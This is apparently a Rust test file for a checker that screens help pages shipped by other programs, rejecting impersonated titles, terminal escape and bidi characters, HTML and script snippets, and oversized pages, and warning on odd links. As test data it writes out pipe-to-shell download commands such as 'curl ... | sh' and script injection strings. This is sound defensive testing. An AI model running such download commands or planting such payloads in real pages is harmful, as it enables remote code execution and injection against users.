//! Tests for the check of pages other programs ship (src/info/check.rs).

use lore_tui::info::check::{check, link_problems, passes, runs_a_download};
use lore_tui::info::content::parse;

const GOOD: &str = "# myapp\n\nSyncs notes.\n\n## Usage\n- `myapp sync` : sync now\n\n## Links\n- Home: https://myapp.example.org\n";

fn errors(name: &str, text: &str) -> Vec<String> {
    check(name, text.as_bytes())
        .into_iter()
        .filter(|f| f.error)
        .map(|f| f.text)
        .collect()
}

#[test]
fn a_plain_page_for_its_own_command_passes() {
    assert!(check("myapp", GOOD.as_bytes()).is_empty());
}

#[test]
fn a_page_cannot_pose_as_another_commands_page() {
    assert_eq!(errors("myapp", &GOOD.replace("# myapp", "# sudo")).len(), 1);
    assert!(
        passes(&check("git-commit", b"# git commit\n\nX.\n")),
        "a subcommand's title"
    );
}

#[test]
fn escape_sequences_and_text_reordering_characters_are_errors() {
    assert_eq!(
        errors("myapp", &GOOD.replace("Syncs", "\x1b]52;c;aGk=\x07Syncs")).len(),
        1
    );
    assert_eq!(
        errors("myapp", &GOOD.replace("Syncs", "Syncs \u{202E}txet")).len(),
        1
    );
    assert_eq!(
        errors("myapp", &GOOD.replace("Syncs", "Sy\u{200B}ncs")).len(),
        1
    );
}

#[test]
fn html_and_script_are_errors() {
    for code in [
        "<script>x</script>",
        "<iframe src=x>",
        "javascript:alert(1)",
        "<img onerror=x>",
    ] {
        assert!(
            !errors("myapp", &GOOD.replace("Syncs notes.", code)).is_empty(),
            "{code}"
        );
    }
}

#[test]
fn a_redirection_from_a_file_named_like_a_tag_is_not_html() {
    let page = GOOD.replace(
        "`myapp sync` : sync now",
        "`scheme <script.scm --quiet` : run it",
    );
    assert!(passes(&check("myapp", page.as_bytes())));
    let tag = GOOD.replace("Syncs notes.", "<SCRIPT src=x>");
    assert!(
        !passes(&check("myapp", tag.as_bytes())),
        "a tag, in capitals too"
    );
}

#[test]
fn an_example_that_runs_a_download_is_an_error() {
    for typed in [
        "curl -s https://x.example/i.sh | sh",
        "wget -qO- https://x.example/i | sudo bash",
        "bash <(curl -s https://x.example/i)",
        "sh -c \"$(curl -fsSL https://x.example/i)\"",
    ] {
        assert!(runs_a_download(typed), "{typed}");
    }
    assert!(!runs_a_download("curl -o file https://x.example/f"));
    assert!(!runs_a_download("ip=$(curl -s https://ifconfig.me)"));
    let page = GOOD.replace("myapp sync", "curl https://x.example/i | bash");
    assert_eq!(errors("myapp", &page).len(), 1);
}

#[test]
fn a_page_too_big_or_not_utf8_is_an_error() {
    let big = format!("# myapp\n\n{}\n", "x".repeat(70 * 1024));
    assert!(!passes(&check("myapp", big.as_bytes())));
    assert!(!passes(&check("myapp", b"# myapp\n\n\xff\xfe\n")));
}

#[test]
fn odd_links_are_warnings_and_do_not_keep_the_page_out() {
    assert!(
        link_problems("https://user:pw@example.org")
            .iter()
            .any(|p| p.contains("password"))
    );
    assert!(
        link_problems("https://xn--pple-43d.com")
            .iter()
            .any(|p| p.contains("punycode"))
    );
    assert!(
        link_problems("https://10.0.0.1/x")
            .iter()
            .any(|p| p.contains("address"))
    );
    assert!(
        link_problems("http://example.org")
            .iter()
            .any(|p| p.contains("https"))
    );
    assert!(link_problems("https://example.org/docs").is_empty());
    let page = GOOD.replace("https://myapp.example.org", "https://xn--pple-43d.com");
    assert!(passes(&check("myapp", page.as_bytes())));
}

#[test]
fn every_page_shown_has_its_invisible_characters_taken_out() {
    let content = parse("# x\n\nSafe \u{202E}text and \u{200B}more.\n");
    assert_eq!(content.summary, ["Safe text and more."]);
}
